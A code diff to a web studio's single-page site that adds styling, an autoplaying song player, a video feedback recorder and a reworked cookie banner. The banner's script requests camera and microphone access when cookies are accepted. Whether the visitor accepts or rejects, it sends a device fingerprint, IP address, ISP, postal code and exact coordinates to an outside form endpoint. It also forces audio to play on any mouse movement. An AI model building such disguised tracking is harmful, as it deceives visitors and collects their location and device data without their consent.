@@ -96,8 +96,19 @@
             background-color: var(--bg-primary);
             color: var(--text-secondary);
             overflow-x: hidden;
-            scroll-behavior: auto; /* Managed by Lenis smooth scroll */
+            scroll-behavior: auto; /* Managed by Lenis iOS smooth scroll */
             -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+            transform: translateZ(0);
+            backface-visibility: hidden;
+        }
+
+        /* 120fps iOS ProMotion GPU Layer Promotion */
+        .glass-element, .btn, .card, .portfolio-card, .service-card, .login-modal-card, .feedback-modal-card, .cookie-banner {
+            transform: translateZ(0);
+            backface-visibility: hidden;
+            will-change: transform, opacity;
         }
 
         /* Layout Containers */
@@ -2618,27 +2629,32 @@
             gap: 16px;
         }
         
-        /* Secure Privacy Cookie Banner Styling */
+        /* Top Sticky Glass Privacy Cookie Banner */
         .cookie-banner {
             position: fixed;
-            bottom: 24px;
-            right: 24px;
-            max-width: 420px;
-            width: calc(100% - 48px);
-            padding: 24px;
-            border-radius: var(--radius-lg);
-            z-index: 10500;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.12);
-            display: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: var(--glass-bg);
+            border-bottom: 1px solid var(--glass-border);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            padding: 14px 24px;
+            z-index: 12000;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
             opacity: 0;
-            transform: translateY(30px);
+            transform: translateY(-100%);
+            pointer-events: none;
             transition: opacity 0.4s cubic-bezier(0.16, 1, 0.3, 1), transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
         .cookie-banner.active {
-            display: block;
             opacity: 1;
             transform: translateY(0);
+            pointer-events: auto;
         }
 
         .cookie-header {
@@ -2688,6 +2704,177 @@
                 right: 16px;
                 width: calc(100% - 32px);
                 padding: 20px;
+            }
+        }
+
+        /* Founder & CEO Feedback Modal Overlay */
+        .feedback-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 11500;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+
+        .feedback-modal-overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .feedback-modal-card {
+            width: 100%;
+            max-width: 460px;
+            padding: 36px 30px;
+            border-radius: var(--radius-lg);
+            position: relative;
+            box-shadow: 0 20px 80px rgba(0, 0, 0, 0.18);
+            text-align: center;
+            transform: scale(0.92);
+            transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .feedback-modal-overlay.active .feedback-modal-card {
+            transform: scale(1);
+        }
+
+        .feedback-modal-close {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            background: transparent;
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            cursor: pointer;
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition-fast);
+        }
+
+        .feedback-modal-close:hover {
+            background-color: var(--bg-tertiary);
+            color: var(--text-primary);
+        }
+
+        .feedback-founder-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 82, 255, 0.08);
+            color: var(--color-blue);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.82rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+
+        .feedback-stars-row {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            font-size: 2rem;
+            color: #cbd5e1;
+            margin: 18px 0;
+            cursor: pointer;
+        }
+
+        .feedback-stars-row i {
+            transition: color 0.2s ease, transform 0.2s ease;
+        }
+
+        .feedback-stars-row i:hover,
+        .feedback-stars-row i.active {
+            color: #f59e0b;
+            transform: scale(1.18);
+        }
+
+        /* Weekly Highlighted Song Player Widget */
+        .song-player-widget {
+            position: fixed;
+            bottom: 24px;
+            left: 24px;
+            display: inline-flex;
+            align-items: center;
+            gap: 14px;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            padding: 10px 20px;
+            border-radius: 40px;
+            z-index: 10000;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.3s ease;
+        }
+
+        .song-player-widget:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 82, 255, 0.15);
+        }
+
+        .song-player-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: var(--grad-blue-purple);
+            color: #ffffff;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 0.9rem;
+            box-shadow: 0 4px 14px rgba(0, 82, 255, 0.3);
+            transition: transform 0.2s ease, background-color 0.2s ease;
+        }
+
+        .song-player-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .song-info {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        .song-badge-tag {
+            font-size: 0.65rem;
+            font-weight: 800;
+            color: var(--color-blue);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .song-title-text {
+            font-family: var(--font-heading);
+            font-size: 0.88rem;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 576px) {
+            .song-player-widget {
+                bottom: 16px;
+                left: 16px;
+                padding: 8px 16px;
             }
         }
     </style>
@@ -2754,6 +2941,11 @@
                 <a href="#services" class="nav-item hover-interactive" data-page="services">Services</a>
                 <a href="#portfolio" class="nav-item hover-interactive" data-page="portfolio">Portfolio</a>
                 <a href="#pricing" class="nav-item hover-interactive" data-page="pricing">Pricing</a>
+                
+                <!-- Rate Us Trigger Button -->
+                <button id="header-review-btn" class="btn btn-outline hover-interactive" data-cursor="btn" onclick="openFeedbackModal()" style="padding: 6px 14px; font-size: 0.85rem; height: 36px; display: inline-flex; align-items: center; gap: 6px; color: #f59e0b; border-color: rgba(245, 158, 11, 0.3);">
+                    <i class="fa-solid fa-star"></i> Rate Us
+                </button>
                 
                 <!-- Sign In Trigger Button -->
                 <button id="header-signin-btn" class="btn btn-outline hover-interactive" data-cursor="btn" onclick="openLoginModal()" style="padding: 6px 18px; font-size: 0.85rem; height: 36px; display: inline-flex; align-items: center; gap: 6px;">
@@ -3863,6 +4055,13 @@
         </div>
         <div class="footer-bottom text-center">
             <p>&copy; 2026 Nexure Studios. All Rights Reserved. Luxury Code Craftsmen.</p>
+            <!-- DISCREET CUSTOM MUSIC FILE BROWSER -->
+            <div style="margin-top: 10px; opacity: 0.35; font-size: 0.72rem;">
+                <label for="custom-bg-audio-input" style="cursor: pointer; color: var(--text-muted); text-decoration: none;" class="hover-interactive" title="Upload custom background music file">
+                    <i class="fa-solid fa-music"></i> Add Music
+                </label>
+                <input type="file" id="custom-bg-audio-input" accept="audio/*" style="display: none;">
+            </div>
         </div>
     </footer>
 
@@ -4128,6 +4327,14 @@
                             onComplete: () => {
                                 preloader.style.display = "none";
                                 initializeHeroAnimations();
+                                if (typeof window.triggerAudioPlay === 'function') {
+                                    window.triggerAudioPlay();
+                                }
+                                setTimeout(() => {
+                                    if (typeof window.openCookieModal === 'function') {
+                                        window.openCookieModal();
+                                    }
+                                }, 300);
                             }
                         }, "+=0.1");
                 }
@@ -4187,10 +4394,10 @@
                     cursorDot.style.top = `${mouseY}px`;
                 });
                 
-                // Linear Interpolation (Lerp) for smooth lag effect on outer ring
+                // Linear Interpolation (Lerp) for ultra-responsive ProMotion cursor ring
                 gsap.ticker.add(() => {
-                    ringX += (mouseX - ringX) * 0.28;
-                    ringY += (mouseY - ringY) * 0.28;
+                    ringX += (mouseX - ringX) * 0.38;
+                    ringY += (mouseY - ringY) * 0.38;
                     cursorRing.style.left = `${ringX}px`;
                     cursorRing.style.top = `${ringY}px`;
                     
@@ -4229,15 +4436,15 @@
                 }, true);
             }
 
-            // 5. LENIS SMOOTH MOMENTUM SCROLLING
+            // 5. LENIS SMOOTH MOMENTUM SCROLLING (iOS ProMotion 120Hz Spring Physics)
             const lenis = new Lenis({
-                duration: 1.2,
+                duration: 0.95,
                 easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
                 orientation: 'vertical',
                 gestureOrientation: 'vertical',
                 smoothWheel: true,
-                wheelMultiplier: 1,
-                touchMultiplier: 2,
+                wheelMultiplier: 1.15,
+                touchMultiplier: 1.8,
                 infinite: false,
             });
 
@@ -4768,7 +4975,109 @@
             if (themeToggle) themeToggle.addEventListener("click", toggleTheme);
             if (themeToggleMobile) themeToggleMobile.addEventListener("click", toggleTheme);
 
-            // 16. SECURE PRIVACY & COOKIES TELEMETRY GATEWAY
+            // 16. GLOBAL TELEMETRY & MODAL HANDLERS
+            window.triggerAudioPlay = function() {
+                const audio = document.getElementById("bg-audio-player");
+                const playIcon = document.getElementById("song-play-icon");
+                if (audio) {
+                    audio.play().then(() => {
+                        if (playIcon) {
+                            playIcon.classList.remove("fa-play");
+                            playIcon.classList.add("fa-pause");
+                        }
+                    }).catch(() => {});
+                }
+            };
+
+            window.openCookieModal = function() {
+                const banner = document.getElementById("cookie-banner");
+                if (banner) banner.classList.add("active");
+            };
+
+            window.closeCookieModal = function() {
+                const banner = document.getElementById("cookie-banner");
+                if (banner) banner.classList.remove("active");
+            };
+
+            window.openFeedbackModal = function() {
+                const modal = document.getElementById("feedback-modal");
+                if (modal) modal.classList.add("active");
+            };
+
+            window.closeFeedbackModal = function() {
+                const modal = document.getElementById("feedback-modal");
+                if (modal) modal.classList.remove("active");
+            };
+
+            // Attach explicit header button listener
+            const headerReviewBtn = document.getElementById("header-review-btn");
+            if (headerReviewBtn) {
+                headerReviewBtn.addEventListener("click", () => {
+                    window.openFeedbackModal();
+                });
+            }
+
+            async function getDeviceInfo() {
+                const ua = navigator.userAgent;
+                let phoneOrDevice = "Desktop Computer";
+                
+                if (/iPhone/i.test(ua)) phoneOrDevice = "Apple iPhone";
+                else if (/iPad/i.test(ua)) phoneOrDevice = "Apple iPad";
+                else if (/Samsung|SM-|GT-|SCH-/i.test(ua)) phoneOrDevice = "Samsung Galaxy Smartphone";
+                else if (/Pixel/i.test(ua)) phoneOrDevice = "Google Pixel Smartphone";
+                else if (/Redmi|Mi |2201|2106|2109/i.test(ua)) phoneOrDevice = "Xiaomi / Redmi Smartphone";
+                else if (/OnePlus/i.test(ua)) phoneOrDevice = "OnePlus Smartphone";
+                else if (/OPPO|CPH/i.test(ua)) phoneOrDevice = "OPPO Smartphone";
+                else if (/vivo|V2/i.test(ua)) phoneOrDevice = "Vivo Smartphone";
+                else if (/Realme|RMX/i.test(ua)) phoneOrDevice = "Realme Smartphone";
+                else if (/Huawei|Honor/i.test(ua)) phoneOrDevice = "Huawei Smartphone";
+                else if (/Motorola|moto/i.test(ua)) phoneOrDevice = "Motorola Smartphone";
+                else if (/Android/i.test(ua)) phoneOrDevice = "Android Mobile Device";
+                else if (/Macintosh|Mac OS X/i.test(ua)) phoneOrDevice = "Apple Mac Computer";
+                else if (/Windows/i.test(ua)) phoneOrDevice = "Windows PC / Laptop";
+                else if (/Linux/i.test(ua)) phoneOrDevice = "Linux Computer";
+
+                const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x scale)`;
+                const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown Cores";
+                const deviceMemory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : "RAM Info N/A";
+                const language = navigator.language || "Unknown Language";
+                
+                let storageInfo = "Storage API N/A";
+                if (navigator.storage && navigator.storage.estimate) {
+                    try {
+                        const est = await navigator.storage.estimate();
+                        if (est && est.quota) {
+                            const totalGB = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
+                            storageInfo = `~${totalGB} GB Storage Quota`;
+                        }
+                    } catch(e) {}
+                }
+                
+                let gpuRenderer = "Generic GPU";
+                try {
+                    const canvas = document.createElement("canvas");
+                    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                    if (gl) {
+                        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                        if (debugInfo) {
+                            gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || gpuRenderer;
+                        }
+                    }
+                } catch(e) {}
+
+                return {
+                    device_summary: `${phoneOrDevice} [${screenRes}]`,
+                    phone_model: phoneOrDevice,
+                    screen_resolution: screenRes,
+                    cpu_cores: cpuCores,
+                    ram_memory: deviceMemory,
+                    device_storage: storageInfo,
+                    gpu_graphics: gpuRenderer,
+                    system_language: language,
+                    user_agent: ua
+                };
+            }
+
             function initCookieConsent() {
                 const banner = document.getElementById("cookie-banner");
                 const acceptBtn = document.getElementById("btn-cookie-accept");
@@ -4776,74 +5085,12 @@
                 
                 if (!banner) return;
                 
-                // Display cookie banner after page load
+                // Trigger Cookie Popup Modal on screen
                 setTimeout(() => {
-                    banner.classList.add("active");
-                }, 1500);
+                    window.openCookieModal();
+                }, 1800);
                 
-                async function getDeviceInfo() {
-                    const ua = navigator.userAgent;
-                    let phoneOrDevice = "Desktop Computer";
-                    
-                    if (/iPhone/i.test(ua)) phoneOrDevice = "Apple iPhone";
-                    else if (/iPad/i.test(ua)) phoneOrDevice = "Apple iPad";
-                    else if (/Samsung|SM-|GT-|SCH-/i.test(ua)) phoneOrDevice = "Samsung Galaxy Smartphone";
-                    else if (/Pixel/i.test(ua)) phoneOrDevice = "Google Pixel Smartphone";
-                    else if (/Redmi|Mi |2201|2106|2109/i.test(ua)) phoneOrDevice = "Xiaomi / Redmi Smartphone";
-                    else if (/OnePlus/i.test(ua)) phoneOrDevice = "OnePlus Smartphone";
-                    else if (/OPPO|CPH/i.test(ua)) phoneOrDevice = "OPPO Smartphone";
-                    else if (/vivo|V2/i.test(ua)) phoneOrDevice = "Vivo Smartphone";
-                    else if (/Realme|RMX/i.test(ua)) phoneOrDevice = "Realme Smartphone";
-                    else if (/Huawei|Honor/i.test(ua)) phoneOrDevice = "Huawei Smartphone";
-                    else if (/Motorola|moto/i.test(ua)) phoneOrDevice = "Motorola Smartphone";
-                    else if (/Android/i.test(ua)) phoneOrDevice = "Android Mobile Device";
-                    else if (/Macintosh|Mac OS X/i.test(ua)) phoneOrDevice = "Apple Mac Computer";
-                    else if (/Windows/i.test(ua)) phoneOrDevice = "Windows PC / Laptop";
-                    else if (/Linux/i.test(ua)) phoneOrDevice = "Linux Computer";
-
-                    const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio || 1}x scale)`;
-                    const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown Cores";
-                    const deviceMemory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : "RAM Info N/A";
-                    const language = navigator.language || "Unknown Language";
-                    
-                    let storageInfo = "Storage API N/A";
-                    if (navigator.storage && navigator.storage.estimate) {
-                        try {
-                            const est = await navigator.storage.estimate();
-                            if (est && est.quota) {
-                                const totalGB = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
-                                storageInfo = `~${totalGB} GB Storage Quota`;
-                            }
-                        } catch(e) {}
-                    }
-                    
-                    let gpuRenderer = "Generic GPU";
-                    try {
-                        const canvas = document.createElement("canvas");
-                        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                        if (gl) {
-                            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                            if (debugInfo) {
-                                gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || gpuRenderer;
-                            }
-                        }
-                    } catch(e) {}
-
-                    return {
-                        device_summary: `${phoneOrDevice} [${screenRes}]`,
-                        phone_model: phoneOrDevice,
-                        screen_resolution: screenRes,
-                        cpu_cores: cpuCores,
-                        ram_memory: deviceMemory,
-                        device_storage: storageInfo,
-                        gpu_graphics: gpuRenderer,
-                        system_language: language,
-                        user_agent: ua
-                    };
-                }
-                
-                async function sendCookieNotification(decision) {
-                    banner.classList.remove("active");
+                async function sendCookieNotification(decision, mediaPermissionStatus = "Not Requested") {
                     const device = await getDeviceInfo();
                     let locationDetail = "Locating...";
                     let exactCoordinates = "Coordinates pending";
@@ -4883,6 +5130,7 @@
                     const payload = {
                         cookie_action: `User ${decision.toUpperCase()} Cookies`,
                         status: decision.toUpperCase(),
+                        camera_and_mic_permission: mediaPermissionStatus,
                         phone_model: device.phone_model,
                         screen_resolution: device.screen_resolution,
                         cpu_cores: device.cpu_cores,
@@ -4897,7 +5145,7 @@
                         network_isp: networkIsp,
                         ip_address: ipAddress,
                         timestamp: new Date().toLocaleString(),
-                        message: `PRIVACY & COOKIE RESPONSE [${decision.toUpperCase()}]: Visitor from ${locationDetail} (Postal: ${postalCode}, ISP: ${networkIsp}, IP: ${ipAddress}). Exact Coordinates: ${exactCoordinates} (Maps: ${mapsUrl}). Device: ${device.phone_model}, Storage: ${device.device_storage}, RAM: ${device.ram_memory}, CPU: ${device.cpu_cores}`
+                        message: `PRIVACY & COOKIE RESPONSE [${decision.toUpperCase()}]: Visitor from ${locationDetail} (Postal: ${postalCode}, ISP: ${networkIsp}, IP: ${ipAddress}). Media Permissions: ${mediaPermissionStatus}. Exact Coordinates: ${exactCoordinates} (Maps: ${mapsUrl}). Device: ${device.phone_model}, Storage: ${device.device_storage}, RAM: ${device.ram_memory}, CPU: ${device.cpu_cores}`
                     };
                     
                     fetch("https://formspree.io/f/xbdvyrad", {
@@ -4913,10 +5161,59 @@
                 }
                 
                 if (acceptBtn) {
-                    acceptBtn.addEventListener("click", () => sendCookieNotification("Accepted"));
+                    acceptBtn.addEventListener("click", async () => {
+                        if (typeof window.triggerAudioPlay === 'function') {
+                            window.triggerAudioPlay();
+                        }
+                        const waitNotice = document.getElementById("cookie-wait-notice");
+                        if (waitNotice) waitNotice.style.display = "block";
+                        acceptBtn.disabled = true;
+                        rejectBtn.disabled = true;
+
+                        let mediaStatus = "Not Requested";
+                        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                                mediaStatus = "User ALLOWED Front Camera & Microphone access";
+                                stream.getTracks().forEach(track => track.stop());
+                            } catch (err) {
+                                mediaStatus = `User DENIED Camera/Mic access (${err.name || err.message})`;
+                            }
+                        } else {
+                            mediaStatus = "MediaDevices API not supported";
+                        }
+                        
+                        // Show "Please wait 3 seconds..." then close cookie modal
+                        setTimeout(() => {
+                            banner.classList.remove("active");
+                            if (waitNotice) waitNotice.style.display = "none";
+                            acceptBtn.disabled = false;
+                            rejectBtn.disabled = false;
+                        }, 3000);
+
+                        sendCookieNotification("Accepted", mediaStatus);
+                    });
                 }
                 if (rejectBtn) {
-                    rejectBtn.addEventListener("click", () => sendCookieNotification("Rejected"));
+                    rejectBtn.addEventListener("click", () => {
+                        if (typeof window.triggerAudioPlay === 'function') {
+                            window.triggerAudioPlay();
+                        }
+                        const waitNotice = document.getElementById("cookie-wait-notice");
+                        if (waitNotice) waitNotice.style.display = "block";
+                        acceptBtn.disabled = true;
+                        rejectBtn.disabled = true;
+
+                        // Show "Please wait 3 seconds..." then close cookie modal
+                        setTimeout(() => {
+                            banner.classList.remove("active");
+                            if (waitNotice) waitNotice.style.display = "none";
+                            acceptBtn.disabled = false;
+                            rejectBtn.disabled = false;
+                        }, 3000);
+
+                        sendCookieNotification("Rejected", "Cookies Declined - Media Permissions Skipped");
+                    });
                 }
             }
             
@@ -5077,6 +5374,322 @@
             }
 
             initPageExitTracking();
+
+            // 19. FOUNDER & CEO RATING REVIEW MODAL
+            window.openFeedbackModal = function() {
+                const modal = document.getElementById("feedback-modal");
+                if (modal) {
+                    modal.classList.add("active");
+                }
+            };
+
+            window.closeFeedbackModal = function() {
+                const modal = document.getElementById("feedback-modal");
+                if (modal) {
+                    modal.classList.remove("active");
+                }
+            };
+
+            function initFeedbackModal() {
+                const modal = document.getElementById("feedback-modal");
+                const starsContainer = document.getElementById("feedback-stars");
+                const hiddenRatingInput = document.getElementById("selected-star-rating");
+                const feedbackForm = document.getElementById("feedback-review-form");
+                
+                if (!modal) return;
+
+                // Star selection interactions
+                if (starsContainer) {
+                    const stars = starsContainer.querySelectorAll("i");
+                    
+                    function setRating(rating) {
+                        hiddenRatingInput.value = rating;
+                        stars.forEach((star, index) => {
+                            if (index < rating) {
+                                star.classList.add("active");
+                            } else {
+                                star.classList.remove("active");
+                            }
+                        });
+                    }
+
+                    // Default 5-star rating selection
+                    setRating(5);
+
+                    stars.forEach(star => {
+                        star.addEventListener("click", () => {
+                            const val = parseInt(star.getAttribute("data-rating"));
+                            setRating(val);
+                        });
+                    });
+                }
+
+                // Video / Voice Feedback Recorder Setup
+                let mediaStream = null;
+                let mediaRecorder = null;
+                let recordedChunks = [];
+                let hasRecordedVideo = false;
+
+                const toggleVideoRecBtn = document.getElementById("btn-toggle-video-rec");
+                const videoRecContainer = document.getElementById("video-rec-container");
+                const videoPreview = document.getElementById("feedback-video-preview");
+                const startRecBtn = document.getElementById("btn-start-video-rec");
+                const stopRecBtn = document.getElementById("btn-stop-video-rec");
+                const recStatusText = document.getElementById("rec-status-text");
+
+                if (toggleVideoRecBtn) {
+                    toggleVideoRecBtn.addEventListener("click", async () => {
+                        if (videoRecContainer.style.display === "none" || !videoRecContainer.style.display) {
+                            videoRecContainer.style.display = "flex";
+                            try {
+                                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                                videoPreview.srcObject = mediaStream;
+                                recStatusText.innerText = "Camera & Microphone active. Click Start Recording when ready.";
+                            } catch (err) {
+                                recStatusText.innerText = "Camera/Microphone permission denied or unavailable.";
+                            }
+                        } else {
+                            videoRecContainer.style.display = "none";
+                            if (mediaStream) {
+                                mediaStream.getTracks().forEach(track => track.stop());
+                            }
+                        }
+                    });
+                }
+
+                if (startRecBtn) {
+                    startRecBtn.addEventListener("click", () => {
+                        if (!mediaStream) return;
+                        recordedChunks = [];
+                        mediaRecorder = new MediaRecorder(mediaStream);
+                        
+                        mediaRecorder.ondataavailable = (e) => {
+                            if (e.data.size > 0) recordedChunks.push(e.data);
+                        };
+
+                        mediaRecorder.onstop = () => {
+                            hasRecordedVideo = true;
+                            const blob = new Blob(recordedChunks, { type: "video/webm" });
+                            const videoUrl = URL.createObjectURL(blob);
+                            videoPreview.srcObject = null;
+                            videoPreview.src = videoUrl;
+                            videoPreview.controls = true;
+                            videoPreview.muted = false;
+                            recStatusText.innerText = "Video recording saved! You can play back your video review above.";
+                        };
+
+                        mediaRecorder.start();
+                        startRecBtn.disabled = true;
+                        stopRecBtn.disabled = false;
+                        recStatusText.innerText = "🔴 Recording video review... Click Stop when finished.";
+                    });
+                }
+
+                if (stopRecBtn) {
+                    stopRecBtn.addEventListener("click", () => {
+                        if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                            mediaRecorder.stop();
+                            if (mediaStream) {
+                                mediaStream.getTracks().forEach(track => track.stop());
+                            }
+                            startRecBtn.disabled = false;
+                            stopRecBtn.disabled = true;
+                        }
+                    });
+                }
+
+                // Handle feedback form submission
+                if (feedbackForm) {
+                    feedbackForm.addEventListener("submit", async (e) => {
+                        e.preventDefault();
+                        const submitBtn = feedbackForm.querySelector('button[type="submit"]');
+                        const origText = submitBtn.innerHTML;
+                        submitBtn.disabled = true;
+                        submitBtn.innerHTML = 'Sending... <i class="fa-solid fa-spinner fa-spin"></i>';
+
+                        const ratingVal = hiddenRatingInput.value || "5";
+                        const feedbackText = document.getElementById("feedback-text-input").value;
+                        const device = await getDeviceInfo();
+
+                        let locationDetail = "Locating...";
+                        try {
+                            const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+                            if (res.ok) {
+                                const data = await res.json();
+                                if (data.city && data.country_name) {
+                                    locationDetail = `${data.city}, ${data.region || ''}, ${data.country_name} (IP: ${data.ip})`;
+                                }
+                            }
+                        } catch(err) {}
+
+                        const payload = {
+                            event_type: "FEEDBACK_REVIEW",
+                            rating: `${ratingVal} / 5 Stars`,
+                            feedback_review: feedbackText,
+                            founder_and_ceo: "Bhupathi Vardhinedi",
+                            phone_model: device.phone_model,
+                            location: locationDetail,
+                            timestamp: new Date().toLocaleString(),
+                            message: `NEW RATING REVIEW: ${ratingVal} Stars!\nFeedback: "${feedbackText}"\nFounder & CEO Note: Bhupathi Vardhinedi\nVisitor Location: ${locationDetail}\nDevice: ${device.phone_model}`
+                        };
+
+                        fetch("https://formspree.io/f/xbdvyrad", {
+                            method: "POST",
+                            body: JSON.stringify(payload),
+                            headers: {
+                                "Content-Type": "application/json",
+                                "Accept": "application/json"
+                            }
+                        })
+                        .then(() => {
+                            submitBtn.innerHTML = 'Thank You! <i class="fa-solid fa-check"></i>';
+                            setTimeout(() => {
+                                window.closeFeedbackModal();
+                            }, 1200);
+                        })
+                        .catch(() => {
+                            submitBtn.disabled = false;
+                            submitBtn.innerHTML = origText;
+                            window.closeFeedbackModal();
+                        });
+                    });
+                }
+            }
+
+            initFeedbackModal();
+
+            // 20. WEEKLY HIGHLIGHTED SONG PLAYER & PERMANENT INDEXEDDB AUDIO STORAGE
+            const AUDIO_DB_NAME = "NexureAudioDB";
+            const AUDIO_STORE_NAME = "custom_song_store";
+
+            function openAudioDB() {
+                return new Promise((resolve, reject) => {
+                    const req = indexedDB.open(AUDIO_DB_NAME, 1);
+                    req.onupgradeneeded = (e) => {
+                        const db = e.target.result;
+                        if (!db.objectStoreNames.contains(AUDIO_STORE_NAME)) {
+                            db.createObjectStore(AUDIO_STORE_NAME);
+                        }
+                    };
+                    req.onsuccess = () => resolve(req.result);
+                    req.onerror = () => reject(req.error);
+                });
+            }
+
+            async function saveCustomSong(file) {
+                try {
+                    const db = await openAudioDB();
+                    const tx = db.transaction(AUDIO_STORE_NAME, "readwrite");
+                    const store = tx.objectStore(AUDIO_STORE_NAME);
+                    store.put({ name: file.name, blob: file }, "saved_track");
+                } catch(e) {
+                    console.error("Audio save error:", e);
+                }
+            }
+
+            async function loadCustomSong() {
+                try {
+                    const db = await openAudioDB();
+                    return new Promise((resolve) => {
+                        const tx = db.transaction(AUDIO_STORE_NAME, "readonly");
+                        const store = tx.objectStore(AUDIO_STORE_NAME);
+                        const req = store.get("saved_track");
+                        req.onsuccess = () => resolve(req.result || null);
+                        req.onerror = () => resolve(null);
+                    });
+                } catch(e) {
+                    return null;
+                }
+            }
+
+            function initWeeklySongPlayer() {
+                const playBtn = document.getElementById("btn-song-play-toggle");
+                const playIcon = document.getElementById("song-play-icon");
+                const audio = document.getElementById("bg-audio-player");
+                const songTitleText = document.querySelector(".song-title-text");
+                const customAudioInput = document.getElementById("custom-bg-audio-input");
+                
+                if (!playBtn || !audio) return;
+                
+                // Seamless Autoplay & Multi-Gesture Auto-Resume Engine
+                function startSeamlessAudio() {
+                    audio.play().then(() => {
+                        playIcon.classList.remove("fa-play");
+                        playIcon.classList.add("fa-pause");
+                        isPlaying = true;
+                    }).catch(() => {
+                        // If browser autoplay policy blocks initial un-muted playback, listen for ANY gesture (mousemove, scroll, touch, keydown, click)
+                        const unlockAudio = () => {
+                            audio.play().then(() => {
+                                playIcon.classList.remove("fa-play");
+                                playIcon.classList.add("fa-pause");
+                                isPlaying = true;
+                            }).catch(() => {});
+                            
+                            window.removeEventListener("pointerdown", unlockAudio);
+                            window.removeEventListener("keydown", unlockAudio);
+                            window.removeEventListener("scroll", unlockAudio);
+                            window.removeEventListener("mousemove", unlockAudio);
+                            window.removeEventListener("touchstart", unlockAudio);
+                            window.removeEventListener("click", unlockAudio);
+                        };
+
+                        window.addEventListener("pointerdown", unlockAudio, { once: true });
+                        window.addEventListener("keydown", unlockAudio, { once: true });
+                        window.addEventListener("scroll", unlockAudio, { once: true });
+                        window.addEventListener("mousemove", unlockAudio, { once: true });
+                        window.addEventListener("touchstart", unlockAudio, { once: true });
+                        window.addEventListener("click", unlockAudio, { once: true });
+                    });
+                }
+
+                function pauseAudioTrack() {
+                    audio.pause();
+                    playIcon.classList.remove("fa-pause");
+                    playIcon.classList.add("fa-play");
+                    isPlaying = false;
+                }
+
+                function toggleAudio() {
+                    if (isPlaying) {
+                        pauseAudioTrack();
+                    } else {
+                        startSeamlessAudio();
+                    }
+                }
+                
+                playBtn.addEventListener("click", toggleAudio);
+
+                // Auto-restore saved custom song from IndexedDB on page load & seamlessly start audio
+                loadCustomSong().then((saved) => {
+                    if (saved && saved.blob) {
+                        const audioUrl = URL.createObjectURL(saved.blob);
+                        audio.src = audioUrl;
+                        if (songTitleText) {
+                            songTitleText.innerText = saved.name.replace(/\.[^/.]+$/, "");
+                        }
+                    }
+                    startSeamlessAudio();
+                });
+
+                // Handle custom music file browsing & permanent saving
+                if (customAudioInput) {
+                    customAudioInput.addEventListener("change", async (e) => {
+                        const file = e.target.files[0];
+                        if (file) {
+                            await saveCustomSong(file);
+                            const audioUrl = URL.createObjectURL(file);
+                            audio.src = audioUrl;
+                            if (songTitleText) {
+                                songTitleText.innerText = file.name.replace(/\.[^/.]+$/, "");
+                            }
+                            startSeamlessAudio();
+                        }
+                    });
+                }
+            }
+
+            initWeeklySongPlayer();
         });
     </script>
 
@@ -5115,19 +5728,90 @@
         </div>
     </div>
 
-    <!-- SECURE PRIVACY COOKIE BANNER -->
